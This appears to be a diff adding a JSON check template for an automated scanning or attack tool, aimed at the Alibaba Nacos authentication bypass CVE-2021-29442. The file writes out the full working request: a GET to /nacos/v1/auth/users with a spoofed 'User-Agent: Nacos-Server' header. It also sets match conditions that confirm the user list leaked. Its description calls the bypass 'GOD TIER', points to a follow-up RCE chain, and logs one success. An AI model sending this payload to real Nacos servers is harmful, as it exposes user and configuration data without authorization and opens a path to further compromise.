@@ -1,0 +1,35 @@
+{
+  "name": "infra/Nacos CVE-2021-29442 UA auth bypass",
+  "description": "[critical] GOD TIER — Alibaba Nacos authentication bypass (CVE-2021-29442, nuclei template nacos-auth-bypass.yaml): sending User-Agent: Nacos-Server makes /v1/auth/users return the identity/user list WITHOUT credentials = full admin-surface bypass (Derby RCE chain follow-up). Keywords: nacos cve-2021-29442 auth bypass user-agent nacos-server users config. ctrl: patched installs answer 404/403 -> not falsified. base_url = http://<nacos>:8848 (skill rides /nacos/v1/auth/users).",
+  "cwe": "CWE-288",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/nacos/v1/auth/users?pageNo=1&pageSize=9",
+      "headers": {
+        "User-Agent": "Nacos-Server"
+      }
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\\\"userList\\\"|\\\"totalCount\\\"|\\\"pageList\\\"",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "c56613f360a5",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
